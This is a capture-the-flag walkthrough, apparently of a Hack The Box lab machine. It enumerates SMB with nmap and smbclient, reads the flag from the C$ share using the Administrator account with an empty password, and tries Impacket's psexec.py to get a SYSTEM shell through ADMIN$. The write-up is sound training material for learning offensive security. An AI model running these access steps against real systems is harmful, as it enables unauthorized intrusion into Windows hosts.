# Enumeration

Start nmap with -sC (Defalt script) and -Pn (Probe firewall)
```shell
└─$ nmap -sC -Pn 10.129.157.192 -o enumeration/nmap.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-02 21:23 CEST
Nmap scan report for 10.129.157.192
Host is up (0.036s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-02T19:24:06
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 45.14 seconds
```

Relevant information about SMB:
```
Inherently, SMB (Server Message Block) is a file sharing protocol, which means that we might extract some
useful byproducts by exploring it. This can be achieved by using the smbclient tool. It comes pre-installed
with the Parrot OS used by Pwnbox, but if you don't have it on your VM, you can install it by running the
command below.
Port 135:
The Remote Procedure Call (RPC) service supports communication between Windows
applications. Specifically, the service implements the RPC protocol — a low-level form
of inter-process communication where a client process can make requests of a server
process. Microsoft’s foundational COM and DCOM technologies are built on top of RPC.
The service’s name is RpcSs and it runs inside the shared services host process,
svchost.exe. This is one of the main processes in any Windows operating system & it
should not be terminated.
Port 139:
This port is used for NetBIOS. NetBIOS is an acronym for Network Basic Input/Output
System. It provides services related to the session layer of the OSI model allowing
applications on separate computers to communicate over a local area network. As
strictly an API, NetBIOS is not a networking protocol. Older operating systems ran
NetBIOS over IEEE 802.2 and IPX/SPX using the NetBIOS Frames (NBF) and NetBIOS over
IPX/SPX (NBX) protocols, respectively. In modern networks, NetBIOS normally runs over
TCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in the
network having both an IP address and a NetBIOS name corresponding to a (possibly
different) host name. NetBIOS is also used for identifying system names in
TCP/IP(Windows).
Simply saying, it is a protocol that allows communication of files and printers through
the Session Layer of the OSI Model in a LAN.
Port 445:
This port is used for the SMB. SMB is a network file sharing protocol that requires an
open port on a computer or server to communicate with other systems. SMB ports are
generally port numbers 139 and 445. Port 139 is used by SMB dialects that communicate
over NetBIOS. It's a session layer protocol designed to use in Windows operating
systems over a local network. Port 445 is used by newer versions of SMB (after Windows
2000) on top of a TCP stack, allowing SMB to communicate over the Internet. This also
means you can use IP addresses in order to use SMB like file sharing.
Simply saying, SMB has always been a network file sharing protocol. As such, SMB
requires network ports on a computer or server to enable communication to other
systems. SMB uses either IP port 139 or 445.
```

List shares with smbclient:
```shell
└─$ smbclient -L 10.129.157.192 -U Administrator | tee -a enumeration/smblist.txt
Password for [WORKGROUP\Administrator]:do_connect: Connection to 10.129.157.192 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)


	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

```

# Foothold

Option A:

```shell
└─$ smbclient \\\\10.129.157.192\\C$ -U Administrator 
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> dir
  .                                  DR        0  Thu Apr 22 09:16:03 2021
  ..                                 DR        0  Thu Apr 22 09:16:03 2021
  desktop.ini                       AHS      282  Wed Apr 21 17:23:32 2021
  flag.txt                            A       32  Fri Apr 23 11:39:00 2021

		3774463 blocks of size 4096. 1156676 blocks available
smb: \Users\Administrator\Desktop\> get flag.txt
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> 
exit
└─$ cat flag.txt               
f751c19eda8f61ce81827e6930a1f40c  
```

Option B: Impacket (To confirm with TRX)
We managed to get the SMB command-line interactive interface. However, since we can access this ADMIN$
share, we will try to use a tool called psexec.py to exploit this misconfiguration & get the interactive
system shell. The psexec.py is part of the Impacket framework.

packet creates a remote service by uploading a randomly-named executable on the ADMIN$ share on the
remote system and then register it as a Windows service.This will result in having an interactive shell
available on the remote Windows system via TCP port 445 .
Psexec requires credentials for a user with local administrator privileges or higher since reading/writing to
the ADMIN$ share is required. Once you successfully authenticate, it will drop you into a NT
AUTHORITY\SYSTEM shell.
We can Download Impacket from this [link](https://github.com/SecureAuthCorp/impacket).

Lets use impacket already installed on kali:
```shell
┌──(venv)─[~/…/Tactics/foothold/impacket/examples]
└─$ python3 psexec.py administrator@10.129.157.192
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.157.192.....
[*] Found writable share ADMIN$
[*] Uploading file VJexSgoV.exe
[*] Opening SVCManager on 10.129.157.192.....
[*] Creating service aVMp on 10.129.157.192.....
[*] Starting service aVMp.....
[*] Opening SVCManager on 10.129.157.192.....
[-] Error performing the uninstallation, cleaning up
                                                                                                            
┌──(venv)─[~/…/Tactics/foothold/impacket/examples]

```





